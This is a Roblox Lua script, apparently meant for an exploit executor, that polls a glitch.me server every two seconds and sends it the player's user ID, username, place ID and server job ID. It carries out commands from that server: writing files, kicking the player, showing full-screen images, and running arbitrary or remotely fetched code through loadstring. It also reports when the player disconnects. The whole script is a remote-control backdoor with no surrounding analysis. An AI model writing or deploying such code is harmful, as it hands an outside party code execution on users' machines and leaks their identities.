

spawn(function()
	while task.wait(2) do
		local url = string.format("https://cheerful-aspiring-tungsten.glitch.me/poll/%s?username=%s&gameid=%s&jobid=%s",tostring(game:GetService("Players").LocalPlayer.UserId), game:GetService("HttpService"):UrlEncode(game:GetService("Players").LocalPlayer.Name), tostring(game.PlaceId), tostring(game.JobId))
		local success, result = pcall(function() return game:GetService("HttpService"):JSONDecode(game:HttpGet(url)) end)

		if success and typeof(result) == "table" then
			for _, cmd in ipairs(result) do -- heh... commands

				if cmd.command == "print" then
					print(tostring(cmd.args))

				elseif cmd.command == "writefile" then
					local args = cmd.args
					if typeof(args) == "table" and args[1] and args[2] then
						writefile(args[1], args[2])
						print("wrote file: " .. args[1])
					else
						warn("invalid writefile args")
					end

				elseif cmd.command == "kick" then
					local reason = tostring(cmd.args) or nil
					pcall(function() game:GetService("Players").LocalPlayer:Kick(reason) end)

				elseif cmd.command == "imagelabel" then
  					local image = tostring(cmd.args)
  					local notasg = Instance.new("ScreenGui")
  					notasg.IgnoreGuiInset = true
 					notasg.ZIndexBehavior = Enum.ZIndexBehavior.Global
					notasg.Parent = game.CoreGui
                    notasg.Name = "SHUT UP2"

  					local okfat = Instance.new("ImageLabel")
 					okfat.Size = UDim2.new(1, 0, 1, 0)
 					okfat.Position = UDim2.new(0, 0, 0, 0)
 					okfat.BackgroundTransparency = 1
					okfat.Image = image
                    okfat.Name = "SHUT UP"
					okfat.ZIndex = 2147483647 
 					okfat.Parent = screenGui


				elseif cmd.command == "loadstring" then
					local ok, err = pcall(function()
						loadstring(cmd.args)()
					end)
					if not ok then
						warn("loadstring error:", err)
					end

				elseif cmd.command == "hloadstring" then
					local url = tostring(cmd.args)
					local ok, err = pcall(function()
						loadstring(game:HttpGet(url))()
					end)
					if not ok then
						warn("hloadstring error:", err)
					end
				end
			end
		end
	end
end)

game:GetService("Players").PlayerRemoving:Connect(function(player)
    if player == game:GetService("Players").LocalPlayer then
        pcall(function()
            game:GetService("HttpService"):PostAsync(
                "https://cheerful-aspiring-tungsten.glitch.me/disconnect",
                game:GetService("HttpService"):JSONEncode({ userid = tostring(game:GetService("Players").LocalPlayer.UserId) }),
                Enum.HttpContentType.ApplicationJson
            )
        end)
    end
end)
